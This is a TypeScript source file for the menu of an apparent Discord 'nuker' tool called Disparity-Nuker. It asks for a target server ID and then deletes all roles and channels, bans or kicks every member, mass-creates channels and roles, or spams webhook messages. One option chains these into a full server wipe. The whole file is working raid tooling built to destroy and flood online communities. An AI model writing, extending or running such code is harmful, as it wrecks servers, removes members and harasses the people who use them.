import { Client } from "discord.js";
import db from "../../../database/db";
import { logo, nukingMenuOptions } from "../../../prints/logo";
import { createString } from "../../utils/createString";
import main from "../main";
import ban from "./nuker/ban";
import fs from "fs";
import sleep from "../../utils/sleep";
import deleteChannels from "./nuker/delete-channels";
import createChannel from "./nuker/create-channel";
import deleteRole from "./nuker/deleteRole";
import createRole from "./nuker/createRole";
import kick from "./nuker/kick";
import spam from "./nuker/spam";

export default function nukeMenu(client: Client, rl) {
  console.clear();
  logo();
  nukingMenuOptions();
  rl.question(createString("Enter option"), (option) => {
    if (option === "menu") {
      main(client, rl);
      return;
    }

    if (!["1", "2", "3", "4", "5", "6", "7", "8"].includes(option)) {
      console.log(" ");
      console.log(createString("Invalid option", "semi", "fail"));
      setTimeout(() => {
        nukeMenu(client, rl);
      }, 1000);
      return;
    }
    rl.question(createString("Enter server ID"), async (guildId) => {
      let server = client.guilds.cache.get(guildId);

      if (!server) {
        console.log(" ");
        console.log(createString("Unknown server", "semi", "fail"));
        setTimeout(() => {
          nukeMenu(client, rl);
        }, 1000);
        return;
      }

      let members = server.members.cache.map((m) => m.id);
      let channels = server.channels.cache.map((c) => c.id);
      let roles = server.roles.cache.map((r) => r.id);

      if (fs.existsSync("members.txt")) {
        fs.readFile("members.txt", "utf-8", (err, data) => {
          let fileArray = data.replace(/[\r]/g, "").split("\n");
          members = fileArray;
        });
        await sleep(1000);
      }
      if (option === "1") {
        let templateData = db.get(`template-${db.get("username")}`);

        deleteRole(client, rl, roles, guildId, false);
        deleteChannels(client, channels, guildId, rl, server, false);
        ban(client, members, guildId);
        createRole(
          client,
          guildId,
          {
            name: templateData.roleName,
            amount: templateData.roleAmount,
          },
          rl,
          server,
          false
        );
        createChannel(
          client,
          guildId,
          {
            amount: templateData.channelAmount,
            name: templateData.channelName,
          },
          rl,
          server,
          false,
          true
        );
      }

      if (option === "2") {
        ban(client, members, guildId);
      }
      if (option === "3") {
        kick(client, members, guildId);
      }

      if (option === "4") {
        rl.question(createString("Enter channel names"), (channelName) => {
          rl.question(createString("Enter channel amount"), (channelAmount) => {
            rl.question(
              createString("Would you like to spam webhooks"),
              (spamWebs) => {
                spamWebs = spamWebs.toLowerCase().trim();
                if (spamWebs === "y" || spamWebs === "yes") {
                  spamWebs = true;
                } else spamWebs = false;

                channelAmount = Number(channelAmount);

                if (!channelAmount) {
                  console.log(" ");
                  console.log(
                    createString("Amount is not number", "semi", "fail")
                  );
                  setTimeout(() => {
                    main(client, rl);
                  }, 1000);
                  return;
                }
                createChannel(
                  client,
                  guildId,
                  { amount: channelAmount, name: channelName },
                  rl,
                  server,
                  true,
                  true
                );
              }
            );
          });
        });
      }

      if (option === "5") {
        deleteChannels(client, channels, guildId, rl, server);
      }
      if (option === "6") {
        rl.question(createString("Enter role names"), (roleName) => {
          rl.question(createString("Enter role amount"), (roleAmount) => {
            roleAmount = Number(roleAmount);

            if (!roleAmount) {
              console.log(" ");
              console.log(createString("Amount is not number", "semi", "fail"));
              setTimeout(() => {
                main(client, rl);
              }, 1000);
              return;
            }
            createRole(
              client,
              guildId,
              {
                name: roleName,
                amount: roleAmount,
              },
              rl,
              server
            );
          });
        });
      }
      if (option === "7") {
        deleteRole(client, rl, roles, guildId, true);
      }

      if (option === "8") {
        spam(
          client,
          rl,
          channels,
          db.get(`template-${db.get("username")}`)
            ? db.get(`template-${db.get("username")}`).webhookName
            : "Disparity-Nuker",
          db.get(`template-${db.get("username")}`)
            ? db.get(`template-${db.get("username")}`).webhookMessage
            : "Disparity-Nuker",
          server
        );
      }
    });
  });
}
